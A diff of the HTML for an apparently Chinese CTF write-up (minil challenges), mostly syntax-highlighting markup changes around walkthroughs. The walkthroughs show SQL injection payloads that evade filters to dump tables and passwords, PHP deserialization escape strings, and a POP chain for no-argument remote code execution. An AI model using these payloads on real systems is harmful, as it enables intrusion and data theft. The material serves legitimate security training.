@@ -365,29 +365,29 @@ X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.ar
 </span><span class="lnt">24
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="err">猜列数：</span>
-<span class="mi">1</span><span class="s2">&#34;union select * from ((select 1)A join (select 2)B)#
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="err">猜列数：</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="s2">&#34;union select * from ((select 1)A join (select 2)B)#
 </span><span class="s2">//alert(&#39;Username:1 \nPassword:2&#39;)
 </span><span class="s2">
 </span><span class="s2">爆库名：
-</span><span class="s2">1&#34;</span><span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">((</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">A</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="k">database</span><span class="p">())</span><span class="n">B</span><span class="p">)</span><span class="o">#</span>
-<span class="o">//</span><span class="n">alert</span><span class="p">(</span><span class="s1">&#39;Username:1 \nPassword:minil_sqli&#39;</span><span class="p">)</span>
-
-<span class="err">爆表名：</span>
-<span class="err">因为</span><span class="n">or被滤了</span><span class="err">，所以</span><span class="n">information_schema用不了</span>
-<span class="err">尝试</span><span class="n">sys</span><span class="p">.</span><span class="n">schema_table_statistics无果</span><span class="err">，没事还有</span><span class="n">mysql</span><span class="p">.</span><span class="n">innodb_table_stats</span><span class="err">：</span>
-<span class="mi">1</span><span class="s2">&#34;union select * from ((select table_name from mysql.innodb_table_stats )A join (select 2)B)#
+</span><span class="s2">1&#34;</span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="n">A</span><span class="w"> </span><span class="k">join</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">database</span><span class="p">())</span><span class="n">B</span><span class="p">)</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="n">alert</span><span class="p">(</span><span class="s1">&#39;Username:1 \nPassword:minil_sqli&#39;</span><span class="p">)</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="err">爆表名：</span><span class="w">
+</span><span class="w"></span><span class="err">因为</span><span class="n">or被滤了</span><span class="err">，所以</span><span class="n">information_schema用不了</span><span class="w">
+</span><span class="w"></span><span class="err">尝试</span><span class="n">sys</span><span class="p">.</span><span class="n">schema_table_statistics无果</span><span class="err">，没事还有</span><span class="n">mysql</span><span class="p">.</span><span class="n">innodb_table_stats</span><span class="err">：</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="s2">&#34;union select * from ((select table_name from mysql.innodb_table_stats )A join (select 2)B)#
 </span><span class="s2">//alert(&#39;Username:minil_users1 \nPassword:3&#39;)
 </span><span class="s2">
 </span><span class="s2">//用limit、offset一个一个查（因为concat被过滤了）：
-</span><span class="s2">1&#34;</span><span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">((</span><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">innodb_table_stats</span> <span class="k">limit</span> <span class="mi">1</span> <span class="k">offset</span> <span class="mi">1</span><span class="p">)</span><span class="n">A</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">2</span><span class="p">)</span><span class="n">B</span><span class="p">)</span><span class="o">#</span>
-<span class="o">//</span><span class="n">alert</span><span class="p">(</span><span class="s1">&#39;Username:gtid_slave_pos \nPassword:3&#39;</span><span class="p">)</span>
-<span class="err">就这两条</span>
-
-<span class="err">所以表名：</span><span class="n">minil_users1</span><span class="err">、</span><span class="n">gtid_slave_pos</span>
-
-<span class="err">爆列名：</span>
-<span class="mi">1</span><span class="s2">&#34;union select * from ((select username from minil_users1)A join (select 2)B)#
+</span><span class="s2">1&#34;</span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="n">innodb_table_stats</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">offset</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="n">A</span><span class="w"> </span><span class="k">join</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="n">B</span><span class="p">)</span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="o">//</span><span class="n">alert</span><span class="p">(</span><span class="s1">&#39;Username:gtid_slave_pos \nPassword:3&#39;</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="err">就这两条</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="err">所以表名：</span><span class="n">minil_users1</span><span class="err">、</span><span class="n">gtid_slave_pos</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="err">爆列名：</span><span class="w">
+</span><span class="w"></span><span class="mi">1</span><span class="s2">&#34;union select * from ((select username from minil_users1)A join (select 2)B)#
 </span><span class="s2">//alert(&#39;Username:admin \nPassword:2&#39;)
 </span></code></pre></td></tr></table>
 </div>
@@ -395,10 +395,10 @@ X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.ar
 <p>这里尝试用之前的payload：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="mi">1</span><span class="s2">&#34;union select * from ((select 1)m join (select x.2 from (select * from (select 1)i join (select 2)j union select * from minil_users1)x limit 1 offset 0)t)#
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="mi">1</span><span class="s2">&#34;union select * from ((select 1)m join (select x.2 from (select * from (select 1)i join (select 2)j union select * from minil_users1)x limit 1 offset 0)t)#
 </span></code></pre></td></tr></table>
 </div>
 </div><p>没有用，尝试了一些网上的也没出，等一手wp吧</p>
@@ -406,14 +406,14 @@ X-Forwarded-For:{{()|attr(request.args.x1)|attr(request.args.x2)|attr(request.ar
 <p>wh1sper师傅告诉用：<code>1&quot;||1 limit 1 offset 0#</code>，恍然大悟</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-text" data-lang="text">//爆出当前表所有字段和值
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">//爆出当前表所有字段和值
 alert(&#39;Username:admin \nPassword:You_really_enter_it&#39;)
 alert(&#39;Username:guest \nPassword:1145141919810&#39;)
 alert(&#39;Username:V0n \nPassword:XDSEC_NIUBI&#39;)
@@ -424,7 +424,7 @@ alert(&#39;Username:Flag_1s_heRe \nPassword:goto /flag327a6c4304a&#39;)
 <p>打开是个反序列化逃逸：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -456,7 +456,7 @@ alert(&#39;Username:Flag_1s_heRe \nPassword:goto /flag327a6c4304a&#39;)
 </span><span class="lnt">30
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">include</span> <span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
 <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
 <span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$payload</span><span class="p">){</span>
@@ -494,7 +494,7 @@ alert(&#39;Username:Flag_1s_heRe \nPassword:goto /flag327a6c4304a&#39;)
 <p>源码：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -535,7 +535,7 @@ alert(&#39;Username:Flag_1s_heRe \nPassword:goto /flag327a6c4304a&#39;)
 </span><span class="lnt">39
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nx">show_source</span><span class="p">(</span><span class="s2">&#34;index.php&#34;</span><span class="p">);</span>
 <span class="k">function</span> <span class="nf">write</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;*&#39;</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s1">&#39;\0\0\0&#39;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
@@ -579,11 +579,11 @@ alert(&#39;Username:Flag_1s_heRe \nPassword:goto /flag327a6c4304a&#39;)
 </div><p>payload：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-text" data-lang="text">a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;
 b=AAAA&#34;;s:8:&#34;password&#34;;O:1:&#34;B&#34;:1:{s:1:&#34;b&#34;;O:1:&#34;C&#34;:1:{s:1:&#34;c&#34;;s:8:&#34;flag.php&#34;;}}
 </code></pre></td></tr></table>
 </div>
@@ -595,15 +595,15 @@ b=AAAA&#34;;s:8:&#34;password&#34;;O:1:&#34;B&#34;:1:{s:1:&#34;b&#34;;O:1:&#34;C
 <p>我们目的要将<code>$fuck['V0n']='no_girlfriend'; </code>变为：<code>$fuck['V0n']='has_girlfriend'; </code></p>
 <p>但是直接传进去是没用的，我们得想办法逃逸这段序列化代码</p>
 <p>看图就很明白了：</p>
-<p><img class="alignnone size-full wp-image-447" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200512153738.png" alt="" width="1384" height="480" /></p>
-<p><img class="alignnone size-full wp-image-452" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200512154253.png" alt="" width="1404" height="209" /></p>
+<img class="alignnone size-full wp-image-447" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200512153738.png" alt="" width="1384" height="480" />
+<img class="alignnone size-full wp-image-452" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200512154253.png" alt="" width="1404" height="209" />
 <p>我们输入的payload会赋值给<code>$fuck['mini']</code>看上图我们输入：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-text" data-lang="text">phpphpphpphpphpphpphp&#34;;s:3:&#34;V0n&#34;;s:14:&#34;has_girlfriend&#34;;}
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">phpphpphpphpphpphpphp&#34;;s:3:&#34;V0n&#34;;s:14:&#34;has_girlfriend&#34;;}
 </code></pre></td></tr></table>
 </div>
 </div><p>这段字符串有56个字符，其中php占了21个，但是经过<code>$filter</code>函数的替换</p>
@@ -611,14 +611,14 @@ b=AAAA&#34;;s:8:&#34;password&#34;;O:1:&#34;B&#34;:1:{s:1:&#34;b&#34;;O:1:&#34;C
 <p>于是本来php占的21个字符扩张为了21+35=56个字符，刚好等于之前传入的所有字符长度</p>
 <p>于是所有hack!!!!变为<code>$fuck['mini']</code>的内容，后面构造的序列化字符串就会逃逸出来，闭合以后被php执行</p>
 <p>得到flag：</p>
-<p><img class="alignnone size-full wp-image-449" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200512153746.png" alt="" width="1655" height="212" /></p>
+<img class="alignnone size-full wp-image-449" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200512153746.png" alt="" width="1655" height="212" />
 <p>minil{2aef3ba7-3808-4495-b8f1-6150c0b8c421}</p>
 <h2 id="lets_play_dolls">Let&rsquo;s_Play_Dolls</h2>
 <p>考点：PHP反序列化，无参数RCE</p>
 <p>源码：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -682,7 +682,7 @@ b=AAAA&#34;;s:8:&#34;password&#34;;O:1:&#34;B&#34;:1:{s:1:&#34;b&#34;;O:1:&#34;C
 </span><span class="lnt">62
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span> 
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> 
 <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
 <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])){</span> 
     <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span> 
@@ -749,13 +749,13 @@ b=AAAA&#34;;s:8:&#34;password&#34;;O:1:&#34;B&#34;:1:{s:1:&#34;b&#34;;O:1:&#34;C
 </div><p>最近遇到好多反序列化，本题需要了解以下魔术方法：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-text" data-lang="text">__wakeup：unserialize( )会检查是否存在一个_wakeup( ) 方法。如果存在，则会先调用 _wakeup 方法，预先准备对象需要的资源
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">__wakeup：unserialize( )会检查是否存在一个_wakeup( ) 方法。如果存在，则会先调用 _wakeup 方法，预先准备对象需要的资源
 __construct：具有构造函数的类会在每次创建新对象时先调用此方法。
 __destruct：析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。
 __toString：_toString( ) 方法用于一个类被当成字符串时应怎样回应。
@@ -765,12 +765,12 @@ __toString：_toString( ) 方法用于一个类被当成字符串时应怎样回
 <p>foo1中最主要的是以下函数（简化后）：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">function execute(){
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">function execute(){
           eval($this‐&gt;var);
     }
 </code></pre></td></tr></table>
@@ -779,22 +779,22 @@ __toString：_toString( ) 方法用于一个类被当成字符串时应怎样回
 <p>在foo2中可以看到：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">function __toString(){
-          $this‐&gt;obj‐&gt;execute();
-          return $this‐&gt;var;
-    }
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
+          <span class="nv">$this‐</span><span class="o">&gt;</span><span class="nx">obj‐</span><span class="o">&gt;</span><span class="nx">execute</span><span class="p">();</span>
+          <span class="k">return</span> <span class="nv">$this‐</span><span class="o">&gt;</span><span class="k">var</span><span class="p">;</span>
+    <span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>所以我们要将$obj实例化为foo1对象，然后因为这里是<code>__toString</code>方法，看到foo3中有echo函数可以将对象作为字符串输出：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -802,19 +802,19 @@ __toString：_toString( ) 方法用于一个类被当成字符串时应怎样回
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">function __destruct(){ 
-        if(file_exists($this-&gt;var)){ 
-            echo &#34;<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>&#34;.$this-&gt;var.&#34;exist<span class="p">&lt;/</span><span class="nt">br</span><span class="p">&gt;</span>&#34;; 
-        } 
-        echo &#34;<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>desctuct foo3<span class="p">&lt;/</span><span class="nt">br</span><span class="p">&gt;</span>&#34;; 
-    }
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span> 
+        <span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">)){</span> 
+            <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="o">.</span><span class="s2">&#34;exist&lt;/br&gt;&#34;</span><span class="p">;</span> 
+        <span class="p">}</span> 
+        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;desctuct foo3&lt;/br&gt;&#34;</span><span class="p">;</span> 
+    <span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>所以很明显，将$var实例化为foo2对象即可触发<code>__toString</code>方法</p>
 <p>所以pop链为：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -823,34 +823,34 @@ __toString：_toString( ) 方法用于一个类被当成字符串时应怎样回
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">//$f1 = new foo1();
-//$f2= new foo2();
-//$f3 = new foo3();
-
-//$f3‐&gt;var = $f2;
-//$f2‐&gt;obj = $f1;
-//$f1‐&gt;var = &#34;evil&#34;;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="c1">//$f1 = new foo1();
+</span><span class="c1">//$f2= new foo2();
+</span><span class="c1">//$f3 = new foo3();
+</span><span class="c1"></span>
+<span class="c1">//$f3‐&gt;var = $f2;
+</span><span class="c1">//$f2‐&gt;obj = $f1;
+</span><span class="c1">//$f1‐&gt;var = &#34;evil&#34;;
+</span></code></pre></td></tr></table>
 </div>
 </div><p>总结一下就是实例化foo3以后会触发foo2中的<code>__toString</code>方法，然后调用foo1中的<code>execute()</code>执行evil代码</p>
 <p>当然没有那么简单，还需要绕过以下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $this-&gt;var)) {  
-            if(!preg_match(&#39;/header|bin|hex|oct|dec|na|eval|exec|system|pass/i&#39;,$this-&gt;var)){
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="s1">&#39;;&#39;</span> <span class="o">===</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[^\W]+\((?R)?\)/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">))</span> <span class="p">{</span>  
+            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/header|bin|hex|oct|dec|na|eval|exec|system|pass/i&#39;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">)){</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>(?R)? 这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）</p>
-<p>所以总结就是从$var参数中，匹配匹配字母、数字、下划线，其实就是&rsquo;\w+&rsquo;，然后在匹配一个循环的&rsquo;()'，将匹配的替换为NULL，判断剩下的是否只有&rsquo;;&rsquo;</p>
+<p>所以总结就是从$var参数中，匹配匹配字母、数字、下划线，其实就是'\w+'，然后在匹配一个循环的'()'，将匹配的替换为NULL，判断剩下的是否只有';'</p>
 <p>也就是可以无限嵌套函数但是函数不能有参数</p>
 <p>payload：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -922,7 +922,7 @@ __toString：_toString( ) 方法用于一个类被当成字符串时应怎样回
 </span><span class="lnt">70
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">class</span> <span class="nc">foo1</span><span class="p">{</span>
     <span class="k">public</span> <span class="nv">$var</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
     <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
@@ -985,41 +985,41 @@ __toString：_toString( ) 方法用于一个类被当成字符串时应怎样回
 <span class="nv">$poc</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$f3</span><span class="p">);</span>
 <span class="k">echo</span> <span class="nv">$poc</span><span class="p">;</span>
 <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$poc</span><span class="p">);</span>
-<span class="cp">?&gt;</span>
-
-print_r(array_reverse(scandir(current(localeconv()))));
-这段函数用来查看当前目录下的文件
-
-O:4:&#34;foo3&#34;:2:{s:3:&#34;var&#34;;O:4:&#34;foo2&#34;:2:{s:3:&#34;var&#34;;s:2:&#34;hi&#34;;s:3:&#34;obj&#34;;O:4:&#34;foo1&#34;:1:{s:3:&#34;var&#34;;s:55:&#34;print_r(array_reverse(scandir(current(localeconv()))));&#34;;}}}
-//记得绕过wakeup
-</code></pre></td></tr></table>
+<span class="cp">?&gt;</span><span class="err">
+</span><span class="err">
+</span><span class="err">print_r(array_reverse(scandir(current(localeconv()))));
+</span><span class="err">这段函数用来查看当前目录下的文件
+</span><span class="err">
+</span><span class="err">O:4:&#34;foo3&#34;:2:{s:3:&#34;var&#34;;O:4:&#34;foo2&#34;:2:{s:3:&#34;var&#34;;s:2:&#34;hi&#34;;s:3:&#34;obj&#34;;O:4:&#34;foo1&#34;:1:{s:3:&#34;var&#34;;s:55:&#34;print_r(array_reverse(scandir(current(localeconv()))));&#34;;}}}
+</span><span class="err">//记得绕过wakeup
+</span></code></pre></td></tr></table>
 </div>
 </div><p>得到：</p>
-<p><img class="alignnone size-full wp-image-472" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514145036.png" alt="" width="746" height="80" /></p>
+<img class="alignnone size-full wp-image-472" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514145036.png" alt="" width="746" height="80" />
 <p>直接访问<code>youCanGet1tmaybe</code>得到flag：</p>
 <p>minil{ba5683ec-9b63-4591-9be1-e8f0247e1529}</p>
 <h2 id="无参数rce">无参数RCE</h2>
 <p>举几个栗子：</p>
 <p><code>&lt;?php print_r(scandir('.')); ?&gt;</code>可以用来查看当前目录所有文件</p>
 <p>但是要怎么构造参数里这个点呢，这里介绍个函数：</p>
-<p><code>localeconv()</code>返回一包含本地数字及货币格式信息的数组。而数组第一项就是&rdquo;.&rdquo;</p>
-<p><img class="alignnone size-full wp-image-456" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514110216.png" alt="" width="534" height="194" /></p>
+<p><code>localeconv()</code>返回一包含本地数字及货币格式信息的数组。而数组第一项就是&quot;.&quot;</p>
+<img class="alignnone size-full wp-image-456" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514110216.png" alt="" width="534" height="194" />
 <p>要怎么取到这个点呢，另一个函数：</p>
 <p><code>current()</code>返回数组中的单元，默认取第一个值</p>
-<p><img class="alignnone size-full wp-image-457" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514112512.png" alt="" width="383" height="78" /></p>
-<p><img class="alignnone size-full wp-image-458" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514112653.png" alt="" width="363" height="149" /></p>
+<img class="alignnone size-full wp-image-457" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514112512.png" alt="" width="383" height="78" />
+<img class="alignnone size-full wp-image-458" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514112653.png" alt="" width="363" height="149" />
 <p>所以<code>scandir(current(localeconv()));</code>成功打印出当前目录下文件：</p>
-<p><img class="alignnone size-full wp-image-460" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514112940.png" alt="" width="490" height="86" /></p>
-<p><img class="alignnone size-full wp-image-459" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514112912.png" alt="" width="469" height="76" /></p>
+<img class="alignnone size-full wp-image-460" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514112940.png" alt="" width="490" height="86" />
+<img class="alignnone size-full wp-image-459" src="https://gitee.com/leonsec/images/raw/master/QQ图片20200514112912.png" alt="" width="469" height="76" />
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">scandir(pos(localeconv()));也可以
-//pos是current的别名
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">scandir</span><span class="p">(</span><span class="nx">pos</span><span class="p">(</span><span class="nx">localeconv</span><span class="p">()));</span><span class="nx">也可以</span>
+<span class="c1">//pos是current的别名
+</span></code></pre></td></tr></table>
 </div>
 </div><p>再介绍几个简单常用的：</p>
 <p><code>getcwd()</code>获取当前路径</p>
@@ -1027,7 +1027,7 @@ O:4:&#34;foo3&#34;:2:{s:3:&#34;var&#34;;O:4:&#34;foo2&#34;:2:{s:3:&#34;var&#34;;
 <p><code>chdir()</code>改变工作目录</p>
 <p>如果文件不能直接显示呢？比如php源码</p>
 <p>那我们要怎么取出这个数组呢：</p>
-<p><img class="alignnone size-full wp-image-461" src="https://gitee.com/leonsec/images/raw/master/1625650-20200215122752930-1717233019.png" alt="" width="1043" height="486" /></p>
+<img class="alignnone size-full wp-image-461" src="https://gitee.com/leonsec/images/raw/master/1625650-20200215122752930-1717233019.png" alt="" width="1043" height="486" />
 <p>手册里有这些方法，如果要获取的数组是最后一个那我们直接<code>print_r(readfile(end(scandir(getcwd()))));</code></p>
 <p>或者：<code>print_r(readfile(current(array_reverse(scandir(getcwd())))));</code></p>
 <p><code>array_reverse()</code>以相反的元素顺序返回数组</p>
@@ -1036,55 +1036,55 @@ O:4:&#34;foo3&#34;:2:{s:3:&#34;var&#34;;O:4:&#34;foo2&#34;:2:{s:3:&#34;var&#34;;
 <p><code>array_rand(array_flip())</code>array_flip()是交换数组的键和值，array_rand是随机返回一个数组</p>
